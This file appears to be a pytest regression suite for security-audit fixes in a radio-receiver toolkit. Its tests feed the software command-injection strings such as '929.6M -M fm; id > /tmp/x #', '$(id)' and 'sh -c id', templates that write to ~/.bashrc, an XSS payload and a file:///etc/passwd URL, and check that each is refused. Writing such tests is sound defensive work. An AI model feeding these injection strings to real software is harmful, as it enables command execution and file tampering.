"""CL8 — ship v0.1. One regression test per finding (plan/audit/AUDIT_INDEX.md, cluster CL8).

L4: settings values reach argv only after a strict check, and no decoder ever goes through a
shell. The PoC frequency from the audit is `929.6M -M fm; id > /tmp/x #` in pager.json.
"""
import glob
import json
import os
import re
import stat
import sys
import time

import pytest

SUITE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if SUITE_DIR not in sys.path:
    sys.path.insert(0, SUITE_DIR)
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from PySide6 import QtWidgets  # noqa: E402

POC = "929.6M -M fm; id > /tmp/x #"


def _app():
    return QtWidgets.QApplication.instance() or QtWidgets.QApplication([])


def _until(pred, ms, step_ms=10):
    t = time.time()
    while time.time() - t < ms / 1000:
        _app().processEvents()
        v = pred()
        if v:
            return v
        time.sleep(step_ms / 1000)
    return pred()


from palisade_qt import radio_arbiter as _ra  # noqa: E402
_ORIG_MAKE_LEASE = _ra._make_lease            # the real one; the fixture below stubs it


@pytest.fixture(autouse=True)
def _reset(monkeypatch):
    _app()
    from palisade_qt import radio_arbiter as ra, eventbus
    ra.arbiter.reset_for_tests()
    monkeypatch.setattr(ra, "_make_lease", lambda n: None)
    eventbus.bus.clear()
    yield
    ra.arbiter.reset_for_tests()
    eventbus.bus.clear()


class _Lease:
    def __init__(self):
        self.made, self.released = [], []

    def make(self, name):
        self.made.append(name)
        outer = self

        class L:
            def release(self_inner):
                outer.released.append(name)
        return L()


@pytest.fixture
def fakebin(monkeypatch, tmp_path):
    """rtl_fm / multimon-ng stand-ins that only record that they were run."""
    binz = tmp_path / "fakebin"
    binz.mkdir()
    marker = tmp_path / "ran"
    for name in ("rtl_fm", "multimon-ng", "redsea", "rtl_ais"):
        p = binz / name
        p.write_text("#!/bin/sh\necho %s >> '%s'\nsleep 30\n" % (name, marker))
        p.chmod(p.stat().st_mode | stat.S_IEXEC)
    monkeypatch.setenv("PATH", str(binz) + os.pathsep + os.environ["PATH"])
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.delenv("PALISADE_OFFLINE", raising=False)
    monkeypatch.setenv("QT_QPA_PLATFORM", "minimal")      # open the decoder seams only
    return tmp_path, marker


# ================================================================== L4 — settings -> argv
@pytest.mark.parametrize("bad", [POC, "$(id)", "162.4M`id`", "1e999", "nan", "inf", "", "-f",
                                 "162.4M -s 1", True, None, [], -1, 0, 1e12])
def test_l4_freq_arg_refuses_anything_but_a_number(bad):
    import argsafe
    with pytest.raises(argsafe.SettingsRefused):
        argsafe.freq_arg(bad)


@pytest.mark.parametrize("good,want", [("929.6M", "929.6M"), ("162.400M", "162.400M"),
                                       (145800000, "145800000"), ("88.5e6", "88.5e6"),
                                       (433.92, "433.92")])
def test_l4_freq_arg_keeps_real_frequencies(good, want):
    import argsafe
    assert argsafe.freq_arg(good) == want


@pytest.mark.parametrize("bad", ["40; id", "nan", -1, 61, True, "x", None])
def test_l4_gain_arg_refuses(bad):
    import argsafe
    with pytest.raises(argsafe.SettingsRefused):
        argsafe.gain_arg(bad)


def test_l4_poc_frequency_is_refused_by_every_decoder_builder():
    import argsafe
    import nwr
    import pager
    import rds
    for mod in (pager, rds, nwr):
        with pytest.raises(argsafe.SettingsRefused):
            mod.pipeline_argv(POC, 0)
        with pytest.raises(argsafe.SettingsRefused):
            mod.pipeline_argv("929.6M", "40; id")
    import aprs
    import ais
    for mod in (aprs, ais):
        with pytest.raises(argsafe.SettingsRefused):
            mod.pipeline_argv("0 && id")


def test_l4_builders_return_argv_lists_not_strings():
    import ais
    import aprs
    import nwr
    import pager
    import rds
    for argv in (pager.pipeline_argv("929.6M", 0), rds.pipeline_argv("97.3M", 0),
                 nwr.pipeline_argv("162.400M", 0), aprs.pipeline_argv(0), ais.pipeline_argv(0)):
        assert isinstance(argv, list) and argv
        for stage in argv:
            assert isinstance(stage, list) and all(isinstance(t, str) for t in stage)
    for mod in (pager, rds, nwr, aprs, ais):
        assert not hasattr(mod, "pipeline"), "%s still has a shell-string pipeline()" % mod
    import fm
    with pytest.raises(ValueError):
        fm.pipeline(float("nan"), "wbfm", 40, 0)


def test_l4_no_shell_anywhere_in_shipped_code():
    """No shell=True, os.system, os.popen or `sh -c` / `bash -c` in any shipped module."""
    pat = re.compile(r"shell\s*=\s*True|os\.system\(|os\.popen\(|[\"'](?:ba)?sh[\"']\s*,\s*[\"']-c[\"']")
    bad = []
    for path in glob.glob(os.path.join(SUITE_DIR, "**", "*.py"), recursive=True):
        rel = os.path.relpath(path, SUITE_DIR)
        if rel.startswith(("tests" + os.sep, "plan" + os.sep, ".")) or os.sep + "." in rel:
            continue
        for i, line in enumerate(open(path, encoding="utf-8", errors="replace"), 1):
            code = line.split("#", 1)[0]
            if pat.search(code):
                bad.append("%s:%d" % (rel, i))
    assert bad == [], bad


def test_l4_signals_templates_cannot_change_program_or_smuggle_syntax():
    import argsafe
    import signals
    s = dict(signals.DEFAULTS)
    for src in ("sensors", "acars", "vdl2"):
        s["source"] = src
        argv = signals.build_argv(s)
        assert argv[0] == {"sensors": "rtl_433", "acars": "acarsdec", "vdl2": "dumpvdl2"}[src]
    for key, src, tmpl in (("rtl433_cmd", "sensors", "sh -c id"),
                           ("rtl433_cmd", "sensors", "rtl_433 -g {gain}; id"),
                           ("rtl433_cmd", "sensors", "rtl_433 -w /home/x/.bashrc"),
                           ("rtl433_cmd", "sensors", "rtl_433 -F json:~/.profile"),
                           ("rtl433_cmd", "sensors", "rtl_433 -w ../x"),
                           ("rtl433_cmd", "sensors", "rtl_433 {gain.__class__}"),
                           ("rtl433_cmd", "sensors", "rtl_433 {nokey}"),
                           ("acars_cmd", "acars", "/tmp/evil {freqs}"),
                           ("vdl2_cmd", "vdl2", "dumpvdl2 $(id)")):
        t = dict(signals.DEFAULTS, source=src)
        t[key] = tmpl
        with pytest.raises(argsafe.SettingsRefused):
            signals.build_argv(t)
    with pytest.raises(argsafe.SettingsRefused):
        signals.build_argv(dict(signals.DEFAULTS, source="acars", acars_freqs=["131.55; id"]))
    with pytest.raises(argsafe.SettingsRefused):
        signals.build_argv(dict(signals.DEFAULTS, gain="40 -w x"))


def test_l4_babel_refuses_poc_settings_shows_fault_and_gives_the_radio_back(monkeypatch, fakebin):
    """pager.json carries the PoC frequency: BABEL › POCSAG must not start anything, must say
    SETTINGS REFUSED (never a silent default), must not retry, and must release the radio."""
    home, marker = fakebin
    cfg = home / ".config" / "uconsole-suite"
    cfg.mkdir(parents=True)
    (cfg / "pager.json").write_text(json.dumps({"freq": POC, "gain": 0}))
    from palisade_qt import babel, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    faults, statuses = [], []
    w = babel.DecoderWorker(demo=False, mode="POCSAG")
    w.fault.connect(faults.append)
    w.status.connect(statuses.append)
    w.set_running(True)
    w.start()
    try:
        assert _until(lambda: any("SETTINGS REFUSED" in (st.get("sdr") or {}).get("text", "")
                                  for st in statuses), 4000), statuses
        assert _until(lambda: lease.released, 3000), "the radio was not given back"
        time.sleep(0.5)
        _app().processEvents()
        assert len(lease.made) == 1, "retried after a settings refusal: %r" % lease.made
        assert any("settings refused" in f for f in faults), faults
        assert not any((st.get("sdr") or {}).get("ok") for st in statuses), statuses
        assert not marker.exists(), "a decoder was started with refused settings"
        assert ra.arbiter.owner() is None
    finally:
        w.stop()
        assert w.wait(4000)


def test_l4_prowl_nwr_refuses_bad_channel_and_holds_until_retune(monkeypatch, fakebin):
    home, marker = fakebin
    from palisade_qt import prowl, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    w = prowl.NwrWorker(demo=False, channel=POC, label="WX?")
    faults, statuses = [], []
    w.fault.connect(faults.append)
    w.status.connect(statuses.append)
    w.set_active(True)
    for _ in range(4):
        w.step()
        _app().processEvents()
        time.sleep(0.05)
    try:
        assert any("SETTINGS REFUSED" in (st.get("sdr") or {}).get("text", "") for st in statuses)
        assert not any(st.get("live") for st in statuses), "LIVE with refused settings"
        assert any("settings refused" in f for f in faults)
        assert len(lease.made) <= 1, "re-acquired the radio for refused settings: %r" % lease.made
        assert ra.arbiter.owner() is None
        assert not marker.exists()
    finally:
        w._stop = True
        w._kill()


def test_l4_prowl_fm_refuses_nan_frequency(monkeypatch, fakebin):
    from palisade_qt import prowl, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    w = prowl.FmWorker(demo=False, freq=float("nan"))
    statuses = []
    w.status.connect(statuses.append)
    w.set_active(True)
    w.step()
    _app().processEvents()
    try:
        assert any("SETTINGS REFUSED" in (st.get("sdr") or {}).get("text", "") for st in statuses)
        assert not any(st.get("live") for st in statuses)
        assert ra.arbiter.owner() is None
    finally:
        w._stop = True
        w._kill()


def test_l4_pipegroup_runs_without_a_shell_and_stops_as_a_group(tmp_path):
    import argsafe
    import suite as S
    p = argsafe.spawn_pipeline([[sys.executable, "-c", "print('a;b $(id)')"],
                                [sys.executable, "-c", "import sys; print(sys.stdin.read().strip())"]],
                               text=True)
    assert p.stdout.read().strip() == "a;b $(id)"       # metacharacters are data, not syntax
    p.wait(5)
    q = argsafe.spawn_pipeline([["sleep", "30"], ["sleep", "30"]])
    pg = q.pid
    assert all(os.getpgid(x.pid) == pg for x in q.procs)
    S.stop_group(q, grace=0.5)
    assert q.wait(3) is not None


def test_l4_hub_sdrpp_watcher_has_no_shell():
    src = open(os.path.join(SUITE_DIR, "hub.py")).read()
    assert '"bash", "-c"' not in src
    assert "sys.executable, \"-c\", watcher" in src


def test_l4_pipegroup_missing_stage_kills_the_started_ones(tmp_path):
    """Stage 2 missing (no multimon-ng): stage 1 (rtl_fm) must not be left holding the dongle."""
    import argsafe
    pidfile = tmp_path / "pid"
    with pytest.raises(FileNotFoundError):
        argsafe.spawn_pipeline([[sys.executable, "-c",
                                 "import os,time; open(%r,'w').write(str(os.getpid())); "
                                 "time.sleep(30)" % str(pidfile)],
                                ["no-such-decoder-binary-cl8"]])
    if pidfile.exists():
        pid = int(pidfile.read_text())
        assert _until(lambda: not os.path.exists("/proc/%d" % pid) or
                      open("/proc/%d/stat" % pid).read().split(") ")[1][0] == "Z", 3000)


# ================================================================== C1 — Remote Mode token
def _remote(token="r" * 24):
    pytest.importorskip("flask")
    import headless
    return headless.make_app({"status": lambda: {"active_contacts": 1},
                              "contacts": lambda: [{"id": "<img src=x onerror=alert(1)>"}]},
                             token=token)


def test_c1_remote_mode_refuses_to_build_without_a_token():
    pytest.importorskip("flask")
    import headless
    for bad in (None, "", "short", "x" * 15, 12345, "has space in it 1234"):
        with pytest.raises(ValueError):
            headless.make_app({}, token=bad)


def test_c1_every_route_but_health_needs_the_token():
    c = _remote().test_client()
    assert c.get("/health").status_code == 200
    assert "ts" not in c.get("/health").get_json()            # nothing but liveness unauthed
    for path in ("/", "/api/status", "/api/contacts", "/api/status?token=" + "r" * 24):
        assert c.get(path).status_code == 401, path
    for hdr in ("Bearer " + "r" * 23, "Bearer " + "R" * 24, "r" * 24, "Basic " + "r" * 24):
        assert c.get("/api/contacts", headers={"Authorization": hdr}).status_code == 401, hdr
    ok = c.get("/api/contacts", headers={"Authorization": "Bearer " + "r" * 24})
    assert ok.status_code == 200 and ok.headers["Cache-Control"] == "no-store"
    page = c.get("/?token=" + "r" * 24)
    assert page.status_code == 200 and "default-src 'none'" in page.headers[
        "Content-Security-Policy"]
    html = page.get_data(as_text=True)
    assert "innerHTML" not in html and "Authorization" in html and "replaceState" in html


def test_c1_token_is_generated_once_and_saved_owner_only(tmp_path):
    import headless
    s = {"token": ""}
    tok, changed = headless.ensure_token(s)
    assert changed and headless.valid_token(tok) and s["token"] == tok
    assert headless.ensure_token(s) == (tok, False)
    p = str(tmp_path / "headless.json")
    headless._save_private(p, s)
    assert stat.S_IMODE(os.stat(p).st_mode) == 0o600
    assert json.load(open(p))["token"] == tok


# ================================================================== L3 — one door, OFFLINE default
@pytest.fixture
def net(monkeypatch, tmp_path):
    import netpolicy
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.delenv("PALISADE_NET", raising=False)
    netpolicy.reset_for_tests()
    yield netpolicy
    netpolicy.reset_for_tests()


def test_l3_default_is_offline_and_unknown_settings_fail_closed(net, tmp_path):
    assert net.mode() == "OFFLINE"
    cfg = tmp_path / ".config" / "uconsole-suite"
    cfg.mkdir(parents=True)
    for junk in ('{"mode": "WIDE OPEN"}', "not json", '["ONLINE"]', '{"mode": null}'):
        (cfg / "net.json").write_text(junk)
        assert net.mode() == "OFFLINE", junk
    net.set_mode("LAN")
    assert net.mode() == "LAN" and json.load(open(cfg / "net.json")) == {"mode": "LAN"}


def test_l3_offline_blocks_every_internet_host_and_never_resolves(net, monkeypatch):
    import socket
    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: pytest.fail("OFFLINE resolved a name"))
    for url in ("https://a.basemaps.cartocdn.com/dark_nolabels/3/1/1.png",
                "https://aviationweather.gov/api/data/metar?ids=KDEN",
                "https://celestrak.org/NORAD/elements/gp.php?CATNR=1", "http://desktop:11434/api",
                "http://192.168.1.10/", "http://10.0.0.1/", "http://[fe80::1]/"):
        with pytest.raises(net.NetBlocked):
            net.urlopen(url, timeout=1)
    for host in ("127.0.0.1", "localhost", "::1", "127.8.9.10"):
        assert net.allowed(host)
    assert not net.allowed("")


def test_l3_lan_allows_private_only_and_every_address_must_be_private(net, monkeypatch):
    import socket
    net.set_mode("LAN", persist=False)
    answers = {"desktop": ["192.168.1.20"], "evil": ["192.168.1.20", "93.184.216.34"],
               "public": ["93.184.216.34"]}
    monkeypatch.setattr(socket, "getaddrinfo", lambda h, *a, **k: [
        (0, 0, 0, "", (ip, 0)) for ip in answers.get(h, [])])
    assert net.allowed("desktop") and net.allowed("10.1.2.3") and net.allowed("169.254.1.1")
    assert not net.allowed("evil"), "a name with one public address is not LAN"
    assert not net.allowed("public") and not net.allowed("8.8.8.8") and not net.allowed("nxdomain")


def test_l3_scheme_and_redirects_go_through_the_check(net):
    net.set_mode("ONLINE", persist=False)
    for url in ("file:///etc/passwd", "ftp://x/y", "gopher://x"):
        with pytest.raises(net.NetBlocked):
            net.urlopen(url)
    net.set_mode("LAN", persist=False)
    import urllib.request
    h = net._NoCrossModeRedirect()
    req = urllib.request.Request("http://192.168.1.2/")
    with pytest.raises(net.NetBlocked):
        h.redirect_request(req, None, 302, "Found", {}, "https://example.com/")


def test_l3_requests_are_logged_and_listeners_told(net):
    seen = []
    net.add_listener(seen.append)
    with pytest.raises(net.NetBlocked):
        net.urlopen("https://tfr.faa.gov/x", purpose="sitrep TFR")
    assert seen[-1] == ("blocked", "OFFLINE", "tfr.faa.gov", "sitrep TFR")
    assert net.log()[-1][2:] == ("blocked", "tfr.faa.gov", "sitrep TFR")


def test_l3_no_module_opens_a_url_except_through_netpolicy():
    pat = re.compile(r"urllib\.request\.urlopen\(|from urllib\.request import[^\n]*\burlopen\b|"
                     r"\brequests\.(get|post|put|request)\(|http\.client\.HTTPS?Connection\(")
    bad = []
    for path in glob.glob(os.path.join(SUITE_DIR, "**", "*.py"), recursive=True):
        rel = os.path.relpath(path, SUITE_DIR)
        if rel.startswith(("tests" + os.sep, "plan" + os.sep)) or rel == "netpolicy.py":
            continue
        for i, line in enumerate(open(path, encoding="utf-8", errors="replace"), 1):
            if pat.search(line.split("#", 1)[0]):
                bad.append("%s:%d" % (rel, i))
    assert bad == [], bad


def test_l3_offline_sitrep_metar_says_network_down_not_no_data(net):
    import sitrep
    assert sitrep._metar("KDEN") is False          # False = network down (blocked), not "no data"
    assert sitrep._tfr(["CO"]) is None


def test_l3_offline_map_tiles_fetch_nothing_but_cached_tiles_still_draw(net, tmp_path):
    from palisade_qt.kit import tiles
    cache = tmp_path / "tiles"
    cache.mkdir()
    assert tiles._fetch_one(tiles.TILE_URLS["dark"], 5, 1, 1, cache) is None
    (cache / "2_2.png").write_bytes(b"cached")
    assert tiles._fetch_one(tiles.TILE_URLS["dark"], 5, 2, 2, cache) == b"cached"


def test_l3_net_slot_follows_the_mode_and_the_panel_sets_it(net):
    from palisade_qt.shell import PalisadeHub
    hub = PalisadeHub(demo=False, mode="dark")
    try:
        assert hub.topbar.net.text() == "OFF" and "nothing leaves" in hub.topbar.net.toolTip()
        hub.open_panel("log")
        hub.log_panel.net_buttons["LAN"].click()
        assert _until(lambda: hub.topbar.net.text() == "LAN", 2000)
        assert net.mode() == "LAN"
        hub.log_panel.net_buttons["ONLINE"].click()
        assert _until(lambda: hub.topbar.net.text() == "ON", 2000)
        net.set_mode("OFFLINE")                     # changed elsewhere: the slot follows
        assert _until(lambda: hub.topbar.net.text() == "OFF", 2000)
        hub.topbar.slot_clicked.emit("net")
        _app().processEvents()
    finally:
        hub.close()


# ================================================================== C4 — session log + indicator
@pytest.fixture
def slog():
    from palisade_qt import sessionlog
    sessionlog.log().clear_for_tests()
    yield sessionlog
    sessionlog.log().clear_for_tests()


def test_c4_worker_errors_and_faults_reach_the_log_and_the_strip(net, slog, tmp_path):
    from palisade_qt.shell import PalisadeHub
    hub = PalisadeHub(demo=False, mode="dark")
    try:
        assert hub.topbar.slots["mode"].glyph.shape() == "dot"
        page = hub.page_app("PRISM")
        page.on_error("rtl_power exited: usb_claim_interface error -6")
        assert _until(lambda: hub.topbar.slots["mode"].glyph.shape() == "tri", 2000)
        assert "1 unseen fault" in hub.topbar.slots["mode"].toolTip()
        assert hub.topbar.slots["mode"].text() == "LIVE"           # the word never changes
        page.on_fault("decoder exited after 0.3s")
        assert _until(lambda: "2 unseen faults" in hub.topbar.slots["mode"].toolTip(), 2000)
        hub.topbar.slot_clicked.emit("mode")                       # opens the log, marks seen
        _app().processEvents()
        assert not hub.log_panel.isHidden()
        assert _until(lambda: hub.topbar.slots["mode"].glyph.shape() == "dot", 2000)
        texts = [r["text"] for r in hub.log_panel.table.model.rows]
        assert any("usb_claim_interface" in t for t in texts) and any("0.3s" in t for t in texts)
        log = open(tmp_path / ".cache" / "uconsole-suite" / "session.log").read()
        assert "ERROR PRISM" in log and "FAULT PRISM" in log
    finally:
        hub.close()


def test_c4_repeats_are_counted_not_buried(slog):
    for _ in range(50):
        slog.record("error", "BABEL", "acarsdec not found")
    slog.record("error", "ATLAS", "aircraft.json unreadable")
    items = slog.log().snapshot()
    assert len(items) == 2 and items[1]["count"] == 50


def test_c4_serial_read_failure_is_shown_and_logged(slog, monkeypatch):
    from palisade_qt import forge
    w = forge.SerialWorker(demo=True) if hasattr(forge, "SerialWorker") else None
    if w is None:
        pytest.skip("no SerialWorker")
    rows = []
    w.row.connect(rows.append)

    class Boom:
        def read_lines(self):
            raise OSError("device reports readiness to read but returned no data")

        def close(self):
            pass
    w._reader = Boom()
    w.device = ("esp32", "ESP32")
    w.step()
    _app().processEvents()
    assert any("READ FAILED" in r.get("line", "") for r in rows), rows
    assert any("serial read" in it["text"] for it in slog.log().snapshot())


def test_c4_failed_lease_release_is_logged(slog, monkeypatch):
    from palisade_qt import radio_arbiter as ra

    class L:
        def __init__(self, name):
            pass

        def acquire(self):
            raise RuntimeError("readsb would not stop")

        def release(self):
            raise RuntimeError("systemctl start readsb: sudo refused")
    import suite
    monkeypatch.setattr(suite, "RtlLease", L)
    with pytest.raises(ra.LeaseFailed):
        _ORIG_MAKE_LEASE("X")
    assert any("sudo refused" in it["text"] and it["source"] == "RADIO"
               for it in slog.log().snapshot())


# ================================================================== L2 — harden.sh profiles
def _harden(tmp_path, *args):
    """Run harden.sh with sudo/ufw/ip stubbed on PATH: the stubs only RECORD what would run."""
    import subprocess
    stub = tmp_path / "stub"
    stub.mkdir(exist_ok=True)
    rec = tmp_path / "ran.txt"
    for name, body in (("sudo", 'echo "sudo $*" >> "%s"\n' % rec),
                       ("ufw", 'echo "ufw $*" >> "%s"\n' % rec),
                       ("ip", 'case "$*" in *route*) echo "default via 192.168.7.1 dev wlan0";; '
                              '*) echo "2: wlan0 inet 192.168.7.23/24 brd x";; esac\n')):
        p = stub / name
        p.write_text("#!/bin/sh\n" + body)
        p.chmod(0o755)
    env = dict(os.environ, PATH=str(stub) + os.pathsep + os.environ["PATH"])
    r = subprocess.run(["bash", os.path.join(SUITE_DIR, "harden.sh")] + list(args), env=env,
                       capture_output=True, text=True, timeout=20, stdin=subprocess.DEVNULL)
    ran = rec.read_text().splitlines() if rec.exists() else []
    return r, ran


@pytest.mark.parametrize("flag", ["--field", "--revert"])
def test_l2_field_and_revert_deny_all_inbound_and_never_disable(tmp_path, flag):
    r, ran = _harden(tmp_path, flag, "--yes")
    assert r.returncode == 0, r.stderr
    assert "sudo ufw default deny incoming" in ran and "sudo ufw --force enable" in ran
    assert not any("disable" in c for c in ran), ran
    assert not any("allow from" in c or " allow " in c.replace("allow outgoing", "") for c in ran), ran


def test_l2_dry_runs_change_nothing_and_home_warns_about_client_lans(tmp_path):
    for args in (("--field", "--dry-run"), ("--revert", "--dry-run"), ("--dry-run",)):
        r, ran = _harden(tmp_path, *args)
        assert r.returncode == 0 and ran == [], (args, ran, r.stderr)
    r, _ = _harden(tmp_path, "--dry-run")
    assert "CLIENT's LAN" in r.stdout and "--field" in r.stdout
    src = open(os.path.join(SUITE_DIR, "harden.sh")).read()
    assert "ufw disable" not in src.split("set -euo pipefail", 1)[1]


# ================================================================== L6 + S1 — installer
def _installer_text():
    return open(os.path.join(SUITE_DIR, "install_head.sh")).read(), \
        open(os.path.join(SUITE_DIR, "install_tail.sh")).read()


def test_l6_launchers_are_root_owned_files_not_symlinks_into_home():
    _, tail = _installer_text()
    assert "ln -sf" not in tail
    assert 'sudo install -m 0755 -o root -g root "$TMPL" "/usr/local/bin/$name"' in tail


def test_s1_installer_ships_and_launches_the_qt_hub(tmp_path):
    import subprocess
    head, tail = _installer_text()
    for dep in ("PySide6", "pyqtgraph", "numpy"):
        assert dep in head, dep
    assert '"palisade:-m palisade_qt"' in tail and "Name=PALISADE" in tail
    assert "palisade_qt/shell.py" in tail                     # refuses a payload without it
    assert "receive-only signals" not in tail                 # the old, false description
    out = tmp_path / "inst.sh"
    r = subprocess.run(["bash", os.path.join(SUITE_DIR, "build_installer.sh"), str(out)],
                       cwd=SUITE_DIR, capture_output=True, text=True, timeout=120)
    assert r.returncode == 0 and "bash -n: OK" in r.stdout, r.stdout + r.stderr
    import base64
    import io
    import tarfile
    text = out.read_text()
    b64 = text.split("<<'B64EOF' | tar xz", 1)[1].split("\n", 1)[1].split("\nB64EOF", 1)[0]
    names = tarfile.open(fileobj=io.BytesIO(base64.b64decode(b64)), mode="r:gz").getnames()
    assert any(n.endswith("palisade_qt/shell.py") for n in names)
    assert any(n.endswith("netpolicy.py") for n in names) and any(n.endswith("argsafe.py")
                                                                  for n in names)
    assert not any("__pycache__" in n for n in names)


# ================================================================== S4 — doctor on Python 3.13
def test_s4_doctor_has_no_crypt_or_spwd_import():
    src = open(os.path.join(SUITE_DIR, "doctor.py")).read()
    assert not re.search(r"^\s*import (crypt|spwd)\b", src, re.M)


def test_s4_default_password_check_works_without_crypt_module(tmp_path, monkeypatch):
    import doctor
    monkeypatch.setenv("USER", "dragon")
    fake = lambda word, salt: "$6$s$" + word[::-1]          # noqa: E731
    shadow = tmp_path / "shadow"
    shadow.write_text("root:*:1::::::\ndragon:$6$s$nogard:1::::::\n")
    ok, msg, fix = doctor.chk_default_password(str(shadow), crypt_fn=fake)
    assert ok is False and "common default" in msg and "passwd" in fix
    shadow.write_text("dragon:$6$s$xyzzy-unique:1::::::\n")
    assert doctor.chk_default_password(str(shadow), crypt_fn=fake)[0] is True
    shadow.write_text("dragon:!:1::::::\n")
    assert doctor.chk_default_password(str(shadow), crypt_fn=fake)[0] is None
    shadow.chmod(0)
    if os.geteuid() != 0:
        assert "needs root" in doctor.chk_default_password(str(shadow), crypt_fn=fake)[1]


def test_s4_libcrypt_matches_a_real_hash_when_present():
    import doctor
    fn = doctor._libcrypt()
    if fn is None:
        pytest.skip("no libcrypt on this host")
    h = fn("dragon", "$6$saltsalt$")
    assert h and h.startswith("$6$saltsalt$") and fn("dragon", h) == h and fn("other", h) != h


# ================================================================== P1 / P2 — Wi-Fi survey
_IW = """BSS aa:bb:cc:dd:ee:01(on wlan0) -- associated
\tTSF: 1 usec
\tfreq: 2412
\tcapability: ESS Privacy ShortSlotTime (0x0411)
\tsignal: -45.00 dBm
\tSSID: BSS de:ad:be:ef:00:01
\tRSN:\t * Version: 1
\t\t * Group cipher: CCMP
\t\t * Pairwise ciphers: CCMP
\t\t * Authentication suites: PSK
\t\t * Capabilities: 16-PTKSA-RC 1-GTKSA-RC (0x000c)
BSS aa:bb:cc:dd:ee:02(on wlan0)
\tfreq: 2437
\tcapability: ESS Privacy (0x0011)
\tsignal: -50.00 dBm
\tSSID: OldCam
"""


def test_p1_an_ssid_cannot_inject_a_phantom_access_point():
    import wifisurvey as W
    aps = W.parse_iw_scan(_IW)
    assert [a["bssid"] for a in aps] == ["aa:bb:cc:dd:ee:01", "aa:bb:cc:dd:ee:02"]
    assert aps[0]["ssid"] == "BSS de:ad:be:ef:00:01" and aps[0]["signal"] == -45.0
    assert aps[0]["security"] == "WPA2-PSK", "the real AP was blanked"
    # the header must be a whole MAC at the start of a line
    assert W.parse_iw_scan(" BSS aa:bb:cc:dd:ee:99\n\tSSID: x\n") == []
    assert W.parse_iw_scan("BSS aa:bb:cc:dd:ee:999\n") == []


@pytest.mark.parametrize("cap,rsn,wpa,want", [
    ("ESS (0x0001)", None, False, "open"),
    ("ESS Privacy (0x0011)", None, False, "WEP"),
    ("ESS Privacy (0x0011)", None, True, "WPA"),
    ("ESS Privacy (0x0011)", "PSK", False, "WPA2-PSK"),
    ("ESS Privacy (0x0011)", "FT/PSK PSK/SHA-256", False, "WPA2-PSK"),
    ("ESS Privacy (0x0011)", "SAE", False, "WPA3-SAE"),
    ("ESS Privacy (0x0011)", "PSK SAE", False, "WPA2/WPA3"),
    ("ESS Privacy (0x0011)", "IEEE 802.1X", False, "WPA2-EAP"),
    ("ESS Privacy (0x0011)", "IEEE 802.1X/SUITE-B-192", False, "WPA3-EAP"),
    ("ESS Privacy (0x0011)", "OWE", False, "OWE"),
    ("ESS Privacy (0x0011)", "", False, "WPA2/3"),
])
def test_p2_security_class_from_privacy_bit_and_akm(cap, rsn, wpa, want):
    import wifisurvey as W
    t = "BSS 00:11:22:33:44:55(on wlan0)\n\tcapability: %s\n\tSSID: n\n" % cap
    if rsn is not None:
        t += "\tRSN:\t * Version: 1\n"
        if rsn:
            t += "\t\t * Authentication suites: %s\n" % rsn
    if wpa:
        t += "\tWPA:\t * Version: 1\n\t\t * Authentication suites: PSK\n"
    aps = W.parse_iw_scan(t)
    assert aps[0]["security"] == want
    assert W.open_networks(aps) == (aps if want == "open" else [])     # WEP is not "open"


# ================================================================== P3 — untrusted positions
def test_p3_ais_refuses_a_bad_or_missing_checksum():
    import ais
    good = "!AIVDM,1,1,,B,177KQJ5000G?tO`K>RA1wUbN0TKH,0*5C"
    assert ais.decode_sentence(good)["mmsi"] == 477553000
    for bad in (good[:-2] + "5D", good.rsplit("*", 1)[0], good.replace("177K", "177L"),
                good[:-2] + "ZZ"):
        assert ais.decode_sentence(bad) is None, bad
        assert ais.AivdmAssembler().feed(bad) is None, bad
    assert all(ais.nmea_ok(s) for s in ais.Demo.SENTENCES)


def test_p3_one_remote_id_advert_never_raises_a_red_drone():
    from palisade_qt import atlas
    base = {"id": "UAS-1", "lat": 47.6, "lon": -122.3, "operator_lat": 47.61,
            "operator_lon": -122.31, "timestamp": 100.0}
    one = atlas.rid_contacts([dict(base, adverts=1, first=100.0)])
    drone = next(e for e in one if e["payload"]["kind"] == "drone")
    assert drone["severity"] == "warn" and drone["payload"]["trust"] == "unconfirmed"
    assert drone["payload"]["label"].endswith("?")
    burst = atlas.rid_contacts([dict(base, adverts=50, first=99.5)])     # many, but within 0.5 s
    assert next(e for e in burst if e["payload"]["kind"] == "drone")["severity"] == "warn"
    held = atlas.rid_contacts([dict(base, adverts=4, first=97.0)])
    d = next(e for e in held if e["payload"]["kind"] == "drone")
    assert d["severity"] == "alert" and d["payload"]["trust"] == "confirmed"


def test_p3_atlas_marks_unconfirmed_amber_and_shows_source_trust(net):
    from palisade_qt import atlas, eventbus
    eventbus.set_home((47.6, -122.3), "test")
    app = atlas.AtlasApp(demo=False, mode="dark")
    try:
        for ev in atlas.rid_contacts([{"id": "UAS-9", "lat": 47.61, "lon": -122.3,
                                       "timestamp": 1.0, "first": 1.0, "adverts": 1}]):
            app._on_event(ev)
        c = app._contacts["UAS-9"]
        assert app._color(c["kind"], c["severity"], c["trust"]) == app._tok["warn"]
        app._show({"_src": c})
        text = " ".join(w.text() for w in app.detail.findChildren(QtWidgets.QLabel))
        assert "UNAUTHENTICATED" in text and "UNCONFIRMED" in text
    finally:
        app.stop()
        eventbus.set_home(None)


# ================================================================== C5 — dead code, one seam
def test_c5_plugins_loader_is_gone_and_offscreen_check_has_one_copy():
    assert not os.path.exists(os.path.join(SUITE_DIR, "plugins.py"))
    assert "import plugins" not in open(os.path.join(SUITE_DIR, "hub.py")).read()
    copies = []
    for path in glob.glob(os.path.join(SUITE_DIR, "palisade_qt", "**", "*.py"), recursive=True):
        src = open(path).read()
        if 'QT_QPA_PLATFORM") == "offscreen"' in src:
            copies.append(os.path.relpath(path, SUITE_DIR))
    assert copies == [os.path.join("palisade_qt", "kit", "seams.py")], copies


def test_retired_tk_gated_tools_are_not_offered_by_the_tk_hub():
    import hub
    keys = {t[0] for t in hub.TILES}
    for k in ("cw", "rtty", "digi", "replay", "pm3", "wifix", "blex", "zb", "zw", "hid"):
        assert k not in keys and k not in hub.Shell.MODS, k
